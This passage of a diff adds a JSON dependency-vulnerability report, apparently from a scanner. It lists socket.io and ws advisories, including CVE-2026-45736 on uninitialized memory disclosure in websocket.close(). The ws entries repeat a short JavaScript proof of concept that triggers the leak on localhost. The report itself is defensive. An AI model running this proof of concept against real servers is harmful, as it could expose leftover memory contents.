or comments about this advisory:  - Open a discussion [here](https://github.com/socketio/socket.io/discussions)  Thanks a lot to [Paul Taylor](https://github.com/Y0ursTruly) for the responsible disclosure.  ### References  - https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115 - https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/socket.io:3.1.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "ws:8.17.1",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2026-45736",
+          "severity": "HIGH",
+          "description": "ws is an open source WebSocket client and server for Node.js. Prior to 8.20.1, the websocket.close() implementation is vulnerable to uninitialized memory disclosure when a TypedArray is passed as the reason argument. This vulnerability is fixed in 8.20.1."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-58qx-3vcg-4xpx (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact  The `websocket.close()` implementation is vulnerable to uninitialized memory disclosure when a `TypedArray` is passed as the reason argument.  ### Proof of concept  ```js import { deepStrictEqual } from 'node:assert'; import { WebSocket, WebSocketServer } from 'ws';  const wss = new WebSocketServer(   { port: 0, skipUTF8Validation: true },   function () {     const { port } = wss.address();     const ws = new WebSocket(`ws://localhost:${port}`, {       skipUTF8Validation: true     });      ws.on('close', function (code, reason) {       deepStrictEqual(reason, Buffer.alloc(80));     });   } );  wss.on('connection', function (ws) {   ws.close(1000, new Float32Array(20)); }); ```  ### Patches  The vulnerability was fixed in ws@8.20.1 (https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086).  ### Credits  Credit for the private and responsible disclosure of this issue goes to [Nikita Skovoroda](https://github.com/ChALkeR).  ### Remarks  Although the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.  ### Resources  - https://github.com/advisories/GHSA-58qx-3vcg-4xpx - https://www.cve.org/CVERecord?id=CVE-2026-45736"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/ws:8.17.1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "ws:8.18.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2026-45736",
+          "severity": "HIGH",
+          "description": "ws is an open source WebSocket client and server for Node.js. Prior to 8.20.1, the websocket.close() implementation is vulnerable to uninitialized memory disclosure when a TypedArray is passed as the reason argument. This vulnerability is fixed in 8.20.1."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-58qx-3vcg-4xpx (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact  The `websocket.close()` implementation is vulnerable to uninitialized memory disclosure when a `TypedArray` is passed as the reason argument.  ### Proof of concept  ```js import { deepStrictEqual } from 'node:assert'; import { WebSocket, WebSocketServer } from 'ws';  const wss = new WebSocketServer(   { port: 0, skipUTF8Validation: true },   function () {     const { port } = wss.address();     const ws = new WebSocket(`ws://localhost:${port}`, {       skipUTF8Validation: true     });      ws.on('close', function (code, reason) {       deepStrictEqual(reason, Buffer.alloc(80));     });   } );  wss.on('connection', function (ws) {   ws.close(1000, new Float32Array(20)); }); ```  ### Patches  The vulnerability was fixed in ws@8.20.1 (https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086).  ### Credits  Credit for the private and responsible disclosure of this issue goes to [Nikita Skovoroda](https://github.com/ChALkeR).  ### Remarks  Although the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.  ### Resources  - https://github.com/advisories/GHSA-58qx-3vcg-4xpx - https://www.cve.org/CVERecord?id=CVE-2026-45736"
+        }
+      ],
+      "filePath": "/src/frontend/package-lock.json?/ws:8.18.0"
+    }
+  ]
+}
